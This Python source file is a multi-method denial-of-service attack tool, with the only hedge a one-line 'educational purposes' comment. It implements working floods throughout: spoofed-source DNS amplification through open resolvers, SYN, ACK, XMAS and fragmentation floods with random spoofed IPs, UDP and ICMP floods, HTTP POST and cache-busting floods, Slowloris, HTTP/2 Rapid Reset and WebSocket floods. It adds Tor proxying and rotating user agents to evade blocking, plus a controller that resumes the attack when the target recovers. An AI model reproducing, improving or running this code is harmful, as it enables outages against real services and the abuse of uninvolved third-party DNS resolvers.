# counter_strike_helper.py
import socket
import random
import string
import threading
import time

from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP, UDP, fragment
from scapy.layers.dns import DNS, DNSQR
from scapy.volatile import RandString
# Add the h2 library to your imports
import h2.connection
import h2.events
import socks
import netifaces  # NEW: Import the netifaces library
from queue import Queue  # NEW: Import Queue for thread-safe job management
import asyncio  # NEW: Import for asynchronous operations
import websockets  # NEW: Import the websockets library
import ipaddress


# ==============================================================================
# WARNING: This is a Denial of Service (DoS) script for educational purposes.
# ==============================================================================

# --- NEW: USER AGENT LIST FOR REALISTIC HEADERS ---
# A list of real-world User-Agent strings to make requests look more legitimate.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
]


# --- NEW: UTILITY TO LOAD AMPLIFIER LIST ---
def load_resolvers(filename="dns_resolvers.txt"):
    """Loads a list of DNS resolver IP addresses from a file."""
    try:
        with open(filename, 'r') as f:
            resolvers = [line.strip() for line in f if line.strip()]
        if not resolvers:
            print(f"[ERROR] Resolver file '{filename}' is empty.")
            return []
        print(f"[INFO] Loaded {len(resolvers)} DNS resolvers for amplification.")
        return resolvers
    except FileNotFoundError:
        print(f"[ERROR] Could not find resolver file: {filename}")
        return []


# --- NEW: DNS Amplification Attack Worker ---
# This worker sends spoofed DNS queries to a list of amplifiers.
def dns_amplification_worker(stop_event, pause_event, victim_ip, resolvers, iface):
    """
    Worker thread that sends spoofed DNS queries to a list of amplifiers.
    The source IP is spoofed to be the victim's IP.
    """
    # We query for "isc.org" with the "ANY" type, which is known to produce a large response,
    # maximizing the amplification factor.
    dns_query = DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))

    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Pick a random resolver from the list for each packet
            resolver_ip = random.choice(resolvers)

            # Craft the spoofed packet:
            # Source IP = Victim's IP
            # Destination IP = Amplifier's IP
            packet = IP(src=victim_ip, dst=resolver_ip) / UDP(dport=53) / dns_query

            send(packet, verbose=0, iface=iface)
        except IndexError:
            # This happens if the resolver list is empty
            print("[ERROR] DNS Amplification worker has no resolvers to attack. Stopping.")
            break
        except Exception:
            pass


# --- NEW: DNS Amplification Attack Controller ---
def attack_dns_amplification(target_url, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for DNS Amplification (DRDoS) attacks."""
    victim_ips = resolve_to_ipv4(target_url)
    resolvers = load_resolvers("dns_resolvers.txt")

    if not victim_ips or not resolvers:
        print("[!] DNS Amplification attack cannot start: Missing victim IP or resolver list.")
        return

    # For this attack, we target the first resolved IP of the victim
    victim_ip = victim_ips[0]
    print(f"[INFO] Targeting victim IP {victim_ip} for amplification attack.")

    attack_end_time = time.time() + duration
    for _ in range(threads):
        t = threading.Thread(
            target=dns_amplification_worker,
            args=(stop_event, pause_event, victim_ip, resolvers, iface)
        )
        t.daemon = True
        t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: More Robust Tor Connection Checker ---
def check_tor_connection():
    """
    Attempts to connect to a list of highly reliable targets through Tor to
    verify that a working circuit can be established.

    :return: True if a connection to ANY target succeeds, False otherwise.
    """
    print("[INFO] Testing Tor connection... This may take up to a minute.")

    # A list of reliable IPs (Google, Cloudflare, Quad9 DNS) and a common port.
    # We use IPs to avoid potential DNS-over-Tor issues during the check itself.
    test_targets = [
        ("8.8.8.8", 53),  # Google DNS
        ("1.1.1.1", 53),  # Cloudflare DNS
        ("9.9.9.9", 53),  # Quad9 DNS
        ("172.217.16.196", 80)  # One of Google's web server IPs
    ]

    # Try each target in the list
    for target_ip, port in test_targets:
        s = None
        print(f"  [+] Trying target: {target_ip}:{port}... ", end="", flush=True)
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.settimeout(20)  # 20 second timeout per target

            s.connect((target_ip, port))

            # If we reach here, the connection was successful!
            print("Success!")
            if s: s.close()
            return True  # Exit the function immediately with a success result

        except socks.ProxyError as e:
            # This indicates a problem with the local proxy itself
            print(f"Failed. Proxy Error: {e}")
            print("[HINT] The Tor service might be down or misconfigured.")
            # If the proxy itself fails, no point in trying other targets
            if s: s.close()
            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            # This means the proxy is working, but the connection *through* it failed.
            # This is normal if a single Tor circuit is bad. We'll just try the next target.
            print(f"Failed (Timeout/Refused). Reason: {type(e).__name__}")
            if s: s.close()
            continue  # Move to the next target in the list

    # If the loop finishes without a single successful connection
    print("\n[ERROR] All connection attempts through Tor failed.")
    print("[HINT] Your Tor service is running but may be unable to establish a stable circuit.")
    print("[HINT] Check for restrictive firewalls, or try restarting the Tor service to get a new circuit.")
    return False


def is_valid_ip(address):
    """Checks if a given string is a valid IPv4 or IPv6 address."""
    try:
        ipaddress.ip_address(address)
        return True
    except ValueError:
        return False


def get_target_ips(target_string):
    """
    Intelligently determines if the target is an IP or a domain name.

    :param target_string: The user's input (can be "example.com" or "1.2.3.4").
    :return: A list of target IP addresses.
    """
    if is_valid_ip(target_string):
        # The user provided an IP address directly.
        print(f"[INFO] Target '{target_string}' is a valid IP. Using it directly.")
        return [target_string]
    else:
        # The user provided a domain name. Resolve it.
        print(f"[INFO] Target '{target_string}' is a domain name. Resolving...")
        return resolve_to_ipv4(target_string)


def resolve_to_ipv4(target_url):
    """Resolves a hostname to a list of its IPv4 addresses."""
    try:
        addr_info = socket.getaddrinfo(target_url, None, family=socket.AF_INET)
        ips = {item[4][0] for item in addr_info}
        resolved_ips = sorted(list(ips))
        print(f"  [+] Resolved '{target_url}' to: {resolved_ips}")
        return resolved_ips
    except socket.gaierror:
        print(f"  [!] DNS resolution failed for '{target_url}'.")
        return []


def generate_random_ip():
    """Generates a random, non-private IP address for spoofing."""
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not (ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.")):
            return ip


def auto_detect_interface():
    """
    Automatically detects the network interface used for the default route (internet).

    :return: The name of the interface (e.g., "en0", "eth0"), or None if not found.
    """
    try:
        # The gateways() function gives us the default gateways for each address family.
        gws = netifaces.gateways()

        # We are interested in the default IPv4 gateway.
        default_gateway_info = gws.get('default', {}).get(netifaces.AF_INET)

        if default_gateway_info:
            # The result is a tuple: (gateway_ip, interface_name)
            interface_name = default_gateway_info[1]
            print(f"[INFO] Auto-detected active network interface: {interface_name}")
            return interface_name
        else:
            print("[WARN] Could not auto-detect the default network interface.")
            return None

    except Exception as e:
        print(f"[WARN] Error while detecting network interface: {e}")
        return None


# --- 2. ADAPTIVE ATTACK CONTROLLER MODULE ---
def check_service_status(target_ip, port, timeout=2):
    """Checks if a TCP service is online by attempting to connect to a port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            if sock.connect_ex((target_ip, port)) == 0:
                return True  # Service is UP
    except Exception:
        pass
    return False  # Service is DOWN or unreachable


def adaptive_attack_controller(target_ip, check_port, stop_event, pause_event, check_interval=10):
    """
    A controller that runs in the background, checks target status,
    and pauses/resumes the attack accordingly.
    """
    print(f"\n[CONTROLLER] Adaptive controller started. Monitoring {target_ip}:{check_port} every {check_interval}s.")
    while not stop_event.is_set():
        is_online = check_service_status(target_ip, check_port)
        if is_online:
            if pause_event.is_set():
                print(f"\n[CONTROLLER] Target has recovered! Resuming attack...")
                pause_event.clear()  # Clear the pause, threads will resume
        else:
            if not pause_event.is_set():
                print(f"\n[CONTROLLER] Target is down! Pausing attack to conserve resources...")
                pause_event.set()  # Set the pause, threads will wait
        time.sleep(check_interval)
    print("\n[CONTROLLER] Main attack stopped. Shutting down.")


# --- 3. REFACTORED ATTACK WORKERS AND CONTROLLERS ---

# --- UDP Flood ---
def udp_worker(stop_event, pause_event, target_ip, port, packet_size):
    """Worker thread that sends a continuous stream of UDP packets."""
    data = b'\x99' * packet_size
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip, port))
            while not stop_event.is_set():
                if pause_event.is_set():
                    time.sleep(1)
                    continue
                s.send(data)
    except socket.error:
        pass


def attack_udp(method, target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for UDP flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        packet_sizes = []
        if method == "UDP-Flood":
            packet_sizes = [375] * threads
        elif method == "UDP-Power":
            packet_sizes = [750] * threads
        elif method == "UDP-Mix":
            packet_sizes = [375] * (threads // 2) + [750] * (threads // 2)

        for size in packet_sizes:
            t = threading.Thread(target=udp_worker, args=(stop_event, pause_event, ip, port, size))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()  # Signal threads to stop if duration expires


# --- SYN Flood ---
def syn_worker(stop_event, pause_event, target_ip, port, iface):
    """Worker thread that sends a continuous stream of spoofed SYN packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            spoofed_ip = generate_random_ip()
            send(IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags="S"), verbose=0, iface=iface)
        except Exception:
            pass


def synflood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for SYN flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=syn_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- NEW: DNS Query Flood Worker ---
# This is a Layer 7 DNS attack. It sends valid, but randomized and non-existent,
# DNS queries to force the target DNS server to perform expensive lookups.
def dns_query_worker(stop_event, pause_event, target_ip, target_domain, iface):
    """Worker thread that sends a continuous stream of randomized DNS queries."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Generate a random subdomain to query. This ensures the record is not cached.
            rand_length = random.randint(10, 16)
            random_subdomain = "".join(
                random.choice(string.ascii_lowercase + string.digits) for _ in range(rand_length))
            full_domain = f"{random_subdomain}.{target_domain}"

            # Craft the DNS query packet using Scapy
            # rd=1 asks the server to perform a recursive query, increasing its workload.
            packet = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))

            # Send the packet. verbose=0 prevents flooding our own console.
            send(packet, verbose=0, iface=iface)
        except Exception:
            # If sending fails for any reason, just continue
            pass


# --- NEW: DNS Query Flood Controller ---
def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for DNS Query Flood attacks."""
    ips = get_target_ips(target_domain)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_domain}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=dns_query_worker, args=(stop_event, pause_event, ip, target_domain, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- ICMP Flood ---
def icmp_worker(stop_event, pause_event, target_ip, iface):
    """Worker thread that sends a continuous stream of ICMP packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            send(IP(dst=target_ip) / ICMP(), verbose=0, iface=iface)
        except Exception:
            pass


def icmpflood(target_url, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for ICMP flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=icmp_worker, args=(stop_event, pause_event, ip, iface))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- UPDATED L7 WORKERS WITH PROXY SUPPORT ---

def http_post_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
    """Worker thread that sends a continuous stream of HTTP POST requests, optionally via a SOCKS proxy."""
    time.sleep(random.uniform(0.01, 0.5))
    s = None  # Initialize s to None for robust error handling
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Conditionally create a proxy socket or a standard socket
            if use_proxy:
                s = socks.socksocket()
                # Default Tor proxy address and port
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Proxied connections are slower, so allow a longer timeout
            s.settimeout(20 if use_proxy else 4)
            s.connect((target_ip, port))

            post_data = "".join(random.sample(string.ascii_letters + string.digits, 100))
            user_agent = random.choice(USER_AGENTS)
            request = (f"POST / HTTP/1.1\nHost: {host_header}\nUser-Agent: {user_agent}\n"
                       f"Content-Type: application/x-www-form-urlencoded\nContent-Length: {len(post_data)}\n"
                       f"Connection: close\n\n{post_data}").encode()
            s.send(request)
        except Exception:  # Catch any error (socket, proxy, timeout, etc.)
            time.sleep(0.5)
        finally:
            if s:
                s.close()


def slowloris_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
    """Worker thread that opens and maintains a single Slowloris connection, optionally via a SOCKS proxy."""
    s = None
    try:
        if use_proxy:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.settimeout(30 if use_proxy else 4)
        s.connect((target_ip, port))

        user_agent = random.choice(USER_AGENTS)
        initial_headers = (f"GET /?{random.randint(0, 2000)} HTTP/1.1\nHost: {host_header}\n"
                           f"User-Agent: {user_agent}\n").encode()
        s.send(initial_headers)

        while not stop_event.is_set():
            if pause_event.is_set():
                time.sleep(1)
                continue
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\n".encode())
                time.sleep(15)
            except socket.error:
                break
    except Exception:
        pass
    finally:
        if s:
            s.close()


# --- UPDATED L7 CONTROLLERS TO ACCEPT `use_proxy` FLAG ---

def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
    """Controller for HTTP POST flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=http_post_worker,
                                 args=(stop_event, pause_event, ip, port, target_url, use_proxy))
            t.daemon = True
            t.start()
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200, use_proxy=False):
    """Controller for Slowloris attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(sockets):
            t = threading.Thread(target=slowloris_worker,
                                 args=(stop_event, pause_event, ip, port, target_url, use_proxy))
            t.daemon = True
            t.start()
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: HTTP/2 Rapid Reset Worker ---
# This is a highly efficient Layer 7 attack that exploits the HTTP/2 stream
# cancellation feature. It sends a large number of requests and immediately
# resets them, forcing the server to allocate and then tear down resources
# for each request, leading to CPU exhaustion.
def h2_rapid_reset_worker(stop_event, pause_event, target_ip, port, host_header):
    """Worker thread that performs a rapid reset attack over a single H2 connection."""
    sock = None
    try:
        # Establish a standard TCP connection
        sock = socket.create_connection((target_ip, port), timeout=4)

        # Set up the H2 connection state machine
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # The headers for our rapid-fire requests
        headers = [
            (':method', 'GET'),
            (':authority', host_header),
            (':scheme', 'https' if port == 443 else 'http'),
            (':path', '/'),
            ('user-agent', random.choice(USER_AGENTS)),
        ]

        # Main loop to continuously send and reset streams
        while not stop_event.is_set():
            if pause_event.is_set():
                time.sleep(1)
                continue

            try:
                # In a tight loop, we open a new stream and immediately reset it.
                # This is the core of the attack.
                for _ in range(100):  # Send a burst of 100 resets
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, headers)
                    conn.reset_stream(stream_id)

                # Send the batch of generated frames to the server
                sock.sendall(conn.data_to_send())

                # A very brief sleep to prevent this thread from consuming 100% CPU
                # on a single core just from the Python loop itself.
                time.sleep(0.01)

            except Exception:
                # If any error occurs (e.g., server closes connection), break the loop
                # and the thread will terminate and be restarted by the controller if needed.
                break

    except Exception:
        # Pass on any connection or setup errors
        pass
    finally:
        # Ensure the socket is always closed
        if sock:
            sock.close()


# --- NEW: HTTP/2 Rapid Reset Controller ---
def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, threads=50):
    """Controller for HTTP/2 Rapid Reset attacks."""
    # Note: This attack is so efficient that fewer threads are needed compared to other floods.
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration

    # We use a nested function to allow threads to restart if they fail
    def maintain_worker(ip):
        while not stop_event.is_set():
            worker_thread = threading.Thread(target=h2_rapid_reset_worker,
                                             args=(stop_event, pause_event, ip, port, target_url))
            worker_thread.daemon = True
            worker_thread.start()
            worker_thread.join()  # Wait here until the worker thread dies (e.g., connection drop)
            if not stop_event.is_set():
                time.sleep(1)  # Wait a moment before reconnecting

    for ip in ips:
        for _ in range(threads):
            # Each maintainer thread is responsible for one attack worker
            maintainer = threading.Thread(target=maintain_worker, args=(ip,))
            maintainer.daemon = True
            maintainer.start()

    # Main controller loop to enforce duration
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- CORRECTED: TCP Fragmentation Attack Worker ---
# This version explicitly creates the bytes payload to satisfy type checkers
# and make the code clearer, resolving the warning from the image.
def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port, iface):
    """Worker thread that sends a continuous stream of initial TCP fragments."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Create a large TCP packet that is guaranteed to be fragmented.
            spoofed_ip = generate_random_ip()

            # --- FIX APPLIED HERE ---
            # 1. Explicitly generate the random bytes payload first.
            #    bytes(RandString(...)) forces Scapy's volatile object to evaluate into a concrete bytes object.
            payload_bytes = bytes(RandString(size=1800))

            # 2. Build the packet using the concrete bytes object.
            #    The Raw() layer now receives the 'bytes' it expects.
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='S') / Raw(
                load=payload_bytes)

            # Use Scapy's fragment() function to split the packet.
            fragments = fragment(packet, fragsize=512)

            if fragments:  # Add null check
                # The core of the attack: send only the FIRST fragment.
                send(fragments[0], verbose=0, iface=iface)

        except Exception:
            pass


# --- REFACTORED AND NEW ATTACK CONTROLLERS ---
# --- NEW: TCP Fragmentation Attack Controller ---
def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for TCP Fragmentation attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=tcp_fragmentation_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: "Dynamic Content" / Cache-Busting GET Flood Worker ---
# This worker sends GET requests with randomized query parameters to defeat
# caching layers (CDNs, Varnish, etc.), forcing the origin server to
# process each request individually.
def http_cache_bust_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
    """Worker thread that sends a continuous stream of cache-busting HTTP GET requests."""
    s = None
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            if use_proxy:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(20 if use_proxy else 4)
            s.connect((target_ip, port))

            # --- The Cache-Busting Logic ---
            # Generate random query parameters to make each URL unique
            random_string = "".join(random.sample(string.ascii_letters + string.digits, 8))
            timestamp = int(time.time())

            # Construct the unique path
            path = f"/?query={random_string}&tamp={timestamp}"

            user_agent = random.choice(USER_AGENTS)

            # Craft the GET request with the unique path
            request = (
                f"GET {path} HTTP/1.1\n"
                f"Host: {host_header}\n"
                f"User-Agent: {user_agent}\n"
                f"Cache-Control: no-cache\n"  # Explicitly tell proxies not to cache
                f"Connection: close\n\n"
            ).encode()

            s.send(request)
        except Exception:
            time.sleep(0.5)
        finally:
            if s:
                s.close()


# --- NEW: Cache-Busting GET Flood Controller ---
def attack_http_cache_bust(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
    """Controller for Cache-Busting HTTP GET flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(
                target=http_cache_bust_worker,
                args=(stop_event, pause_event, ip, port, target_url, use_proxy)
            )
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: TCP ACK Flood ---
def ack_worker(stop_event, pause_event, target_ip, port, iface):
    """
    Worker thread that sends a continuous stream of TCP ACK packets.
    This is designed to stress stateful firewalls.
    """
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # The source IP can be real or spoofed. Spoofing is harder to block.
            spoofed_ip = generate_random_ip()

            # The key is flags='A' for ACK
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='A')

            send(packet, verbose=0, iface=iface)
        except Exception:
            pass


def attack_ack_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for TCP ACK flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=ack_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: TCP XMAS Flood ---
def xmas_worker(stop_event, pause_event, target_ip, port, iface):
    """
    Worker thread that sends a continuous stream of TCP XMAS packets.
    These packets have multiple flags set (FIN, PSH, URG) and are designed
    to stress the TCP/IP stack of the target and its firewalls.
    """
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Spoofing the source IP makes it harder to block.
            spoofed_ip = generate_random_ip()

            # The key is the flags='FPU' (FIN, PSH, URG) which lights the packet up "like a Christmas tree".
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='FPU')

            send(packet, verbose=0, iface=iface)
        except Exception:
            pass


def attack_xmas_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for TCP XMAS flood attacks."""
    ips = get_target_ips(target_url)
    if not ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_url}'. Aborting UDP attack.")
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=xmas_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# This is the async worker. It's fine as it is.
async def websocket_worker_async(stop_event, pause_event, target_uri, proxy_opts):
    try:
        # The 'sock' parameter is the correct way to pass a pre-configured PySocks socket
        async with websockets.connect(target_uri, sock=proxy_opts) as websocket:
            while not stop_event.is_set():
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                try:
                    await websocket.ping()
                    await asyncio.sleep(15)
                except websockets.ConnectionClosed:
                    break
    except Exception:
        pass  # Silently handle any connection errors


# THIS IS THE ONLY FUNCTION YOU NEED TO REPLACE
def websocket_worker_sync_wrapper(stop_event, pause_event, target_uri, use_proxy):
    """
    A synchronous wrapper to run the async websocket worker.
    This version handles exceptions gracefully.
    """
    proxy_socket = None
    try:
        if use_proxy:
            # The 'websockets' library needs a connected socket for the proxy
            # We must connect it here in the synchronous part
            host = websockets.uri.parse_uri(target_uri).host
            port = websockets.uri.parse_uri(target_uri).port

            proxy_socket = socks.socksocket()
            proxy_socket.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            proxy_socket.settimeout(20)
            proxy_socket.connect((host, port))

        # asyncio.run() is the modern and correct way to call an async function
        # from a sync context. We pass the already-connected proxy socket.
        asyncio.run(websocket_worker_async(stop_event, pause_event, target_uri, proxy_socket))

    except Exception:
        # If any part of the setup fails (e.g., the proxy connection),
        # this worker thread will simply terminate without crashing the program.
        pass
    finally:
        # Ensure the socket is closed if it was created
        if proxy_socket:
            proxy_socket.close()


def attack_websocket_flood(target_domain, path, port, duration, stop_event, pause_event, sockets=100, use_proxy=False):
    """Controller for WebSocket flood attacks."""
    # Use our intelligent function to get the IP(s) to connect to.
    target_ips = get_target_ips(target_domain)

    if not target_ips:
        print(f"[ERROR] Could not get a valid IP for target '{target_domain}'. Aborting WebSocket attack.")
        return

    # Determine the scheme (ws or wss for secure)
    scheme = "wss" if port == 443 else "ws"

    # The URI will always use the original `target_domain` string for the host part.
    # This is crucial for things like SNI (Server Name Indication) in TLS and
    # for web servers that host multiple sites (virtual hosts).
    target_uri = f"{scheme}://{target_domain}:{port}{path}"

    print(f"[INFO] Targeting WebSocket endpoint URI: {target_uri}")
    print(f"[INFO] Will connect to underlying IP(s): {target_ips}")

    attack_end_time = time.time() + duration
    # Launch all sockets. They will all resolve the domain in the target_uri.
    for _ in range(sockets):
        t = threading.Thread(
            target=websocket_worker_sync_wrapper,
            args=(stop_event, pause_event, target_uri, use_proxy)
        )
        t.daemon = True
        t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: "Heavy Request" HTTP POST Flood ---
def http_heavy_post_worker(stop_event, pause_event, target_ip, port, host_header, path, post_data, use_proxy):
    """
    Worker that sends POST requests to a *specific, resource-intensive* path.
    """
    s = None
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            if use_proxy:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(20 if use_proxy else 4)
            s.connect((target_ip, port))

            # Use the user-provided data, or generate random data if none is given
            data_to_send = post_data if post_data else "".join(random.sample(string.ascii_letters + string.digits, 100))
            user_agent = random.choice(USER_AGENTS)

            # Craft the POST request with the specific path and data
            request = (
                f"POST {path} HTTP/1.1\n"
                f"Host: {host_header}\n"
                f"User-Agent: {user_agent}\n"
                f"Content-Type: application/x-www-form-urlencoded\n"
                f"Content-Length: {len(data_to_send)}\n"
                f"Connection: close\n\n"
                f"{data_to_send}"
            ).encode()

            s.send(request)
        except Exception:
            time.sleep(0.5)
        finally:
            if s:
                s.close()


def attack_heavy_http_post(target_url, path, port, post_data, duration, stop_event, pause_event, threads=150,
                           use_proxy=False):
    """Controller for Heavy HTTP POST flood attacks."""
    ips = get_target_ips(target_url)  # Using our smart IP/domain resolver
    if not ips:
        print(f"[ERROR] Could not resolve target {target_url}. Aborting heavy POST attack.")
        return

    print(f"[INFO] Launching Heavy POST flood on {target_url}:{port}{path}")
    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(
                target=http_heavy_post_worker,
                args=(stop_event, pause_event, ip, port, target_url, path, post_data, use_proxy)
            )
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()
